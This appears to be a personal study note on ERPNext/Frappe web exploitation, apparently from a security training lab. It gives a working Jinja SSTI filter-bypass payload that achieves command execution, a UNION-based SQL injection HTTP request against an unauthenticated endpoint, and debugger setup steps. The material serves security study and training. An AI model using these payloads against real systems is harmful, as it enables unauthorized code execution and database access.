---
{"dg-publish":true,"permalink":"/1-hack-like-a-script-kiddie/web/ssti/ssti-payload/","noteIcon":"","created":"2025-04-15T14:11:19.609-04:00"}
---


















https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java---retrieve-etcpasswd



#### 5.5. Discovering SSTI

1. **Identifying the Rendering Function**:
   ```python
   # /home/frappe/frappe-bench/apps/frappe/frappe/utils/jinja.py
   def render_template(template, context, is_path=None, safe_render=True):
       from frappe import get_traceback, throw
       from jinja2 import TemplateError

       if not template:
           return ""

       if (is_path or template.startswith("templates/") or (template.endswith('.html') and '\n' not in template)):
           return get_jenv().get_template(template).render(context)
       else:
           if safe_render and ".__" in template:
               throw("Illegal template")
           try:
               return get_jenv().from_string(template).render(context)
           except TemplateError:
               throw(title="Jinja Template Error", msg="<pre>{template}</pre><pre>{tb}</pre>".format(template=template, tb=get_traceback()))
   ```

2. **Bypassing SSTI Filters**:
   ```jinja
   {% set string = "ssti" %}
   {% set class = "__class__" %}
   {% set mro = "__mro__" %}
   {% set subclasses = "__subclasses__" %}

   {% set mro_r = string|attr(class)|attr(mro) %}
   {% set subclasses_r = mro_r[1]|attr(subclasses)() %}
   {{ subclasses_r }}
   ```

#### 5.6. Exploiting SSTI

1. **Discovering Remote Command Execution Method**:
   ```jinja
   {% set string = "ssti" %}
   {% set class = "__class__" %}
   {% set mro = "__mro__" %}
   {% set subclasses = "__subclasses__" %}

   {% set mro_r = string|attr(class)|attr(mro) %}
   {% set subclasses_r = mro_r[1]|attr(subclasses)() %}
   {{ subclasses_r[420] }}
   ```

2. **Gaining Remote Command Execution**:
   ```jinja
   {% set string = "ssti" %}
   {% set class = "__class__" %}
   {% set mro = "__mro__" %}
   {% set subclasses = "__subclasses__" %}

   {% set mro_r = string|attr(class)|attr(mro) %}
   {% set subclasses_r = mro_r[1]|attr(subclasses)() %}
   {{ subclasses_r[420](["/usr/bin/touch","/tmp/das-ist-walter"]) }}
   ```
   ```bash
   frappe@ubuntu:~$ ls -lh /tmp/das-ist-walter 
   -rw-rw-r-- 1 frappe frappe 0 Jan 11 10:31 das-ist-walter
   ```

### Summary
- **SQL Injection**: Found by searching for SQL queries in functions exposed to unauthenticated users. Exploited to bypass authentication.
- **SSTI**: Discovered by testing template rendering functionality and bypassing input filters. Exploited to achieve remote code execution.
```

---

### Chapter Summary

In this chapter, you should learn how to:

1. **Identify and exploit SQL Injection vulnerabilities**: Understand how to discover and exploit SQL Injection to bypass authentication and gain access to sensitive areas of the application.

2. **Discover and exploit Server-Side Template Injection (SSTI)**: Learn how to identify SSTI vulnerabilities, bypass filters, and execute arbitrary code on the server.

3. **Configure debugging environments**: Set up remote debugging for the ERPNext application using Visual Studio Code to facilitate vulnerability discovery and exploitation.

4. **Understand MVC and Metadata-driven design patterns**: Grasp the concepts of MVC and Metadata-driven patterns in the context of web applications like ERPNext.

5. **Navigate HTTP routing and whitelisted functions**: Learn how HTTP routing is implemented in Frappe/ERPNext and how to identify whitelisted functions that can be exploited.

6. **Handle MariaDB query logging**: Configure MariaDB to log queries, aiding in the identification of SQL injection points.

Here's a summary of the important points with code snippets and mermaid diagrams:

### Code Snippets

#### SQL Injection

**SQL Injection Payload:**
```http
POST /api/method/frappe.utils.global_search.web_search HTTP/1.1
Host: erpnext:8000
Content-Type: application/x-www-form-urlencoded

cmd=frappe.utils.global_search.web_search&text=offsec&scope=offsec_scope" UNION ALL SELECT 1,2,3,4,5#
```

**SQL Injection Query:**
```sql
SELECT `doctype`, `name`, `content`, `title`, `route`
FROM `__global_search`
WHERE `published` = 1 AND `route` like "offsec_scope" UNION ALL SELECT 1,2,3,4,5#%" AND MATCH(`content`) AGAINST ('\"offsec\"' IN BOOLEAN MODE)
LIMIT 20 OFFSET 0
```

#### SSTI Exploitation

**SSTI Filter Bypass:**
```jinja
{% set string = "ssti" %}
{% set class = "__class__" %}
{% set mro = "__mro__" %}
{% set subclasses = "__subclasses__" %}

{% set mro_r = string|attr(class)|attr(mro) %}
{% set subclasses_r = mro_r[1]|attr(subclasses)() %}
{{ subclasses_r[420](["/usr/bin/touch","/tmp/das-ist-walter"]) }}
```

#### Setting Up Remote Debugging

**Installing ptvsd:**
```bash
frappe@ubuntu:~$ /home/frappe/frappe-bench/env/bin/pip install ptvsd
```

**Editing Procfile:**
```bash
frappe@ubuntu:~$ cat /home/frappe/frappe-bench/Procfile
#web: bench serve --port 8000
```

**Enabling Debugger in app.py:**
```python
import ptvsd
ptvsd.enable_attach(redirect_output=True)
print("Now ready for the IDE to connect to the debugger")
ptvsd.wait_for_attach()

